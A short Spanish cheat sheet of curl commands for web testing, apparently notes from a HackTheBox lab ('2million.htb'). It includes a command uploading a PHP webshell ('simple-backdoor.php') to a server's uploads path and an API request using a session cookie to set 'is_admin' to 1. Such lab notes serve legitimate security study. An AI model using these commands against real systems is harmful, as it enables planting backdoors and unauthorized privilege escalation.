#### Podemos enumerar los headers del servidor web con curl:
`curl -v -I http://<ip>`

#### Ver los métodos HTTP permitidos por el servidor:
`curl -v -X OPTIONS http://<ip>`

#### Crear GET request:
`curl -X GET http://<ip>/`

#### Acceder recurso concreto:
`curl -X GET http://<ip>/home`

#### Subir un fichero:
`curl http://<ip>/uploads --upload-file /usr/share/webshells/php/simple-backdoor.php`

#### Hacer una petición agregando COOKIE de sessión para que no de 401 Anauthorized
```bash
curl -v http://2million.htb/api/v1 --cookie "PHPSESSID=1864av34gp7hi9knhpdb848ojo"
```

#### Hacer una petición con un HEADER customizado
```bash
curl -X PUT -v http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=1864av34gp7hi9knhpdb848ojo" --header "Content-Type: application/json" | jq

```

#### Hacer una petición con un BODY (data)
```bash
curl -X PUT -v http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=1864av34gp7hi9knhpdb848ojo" --header "Content-Type: application/json" --data '{"email":"test@test.com","is_admin":1}' | jq

```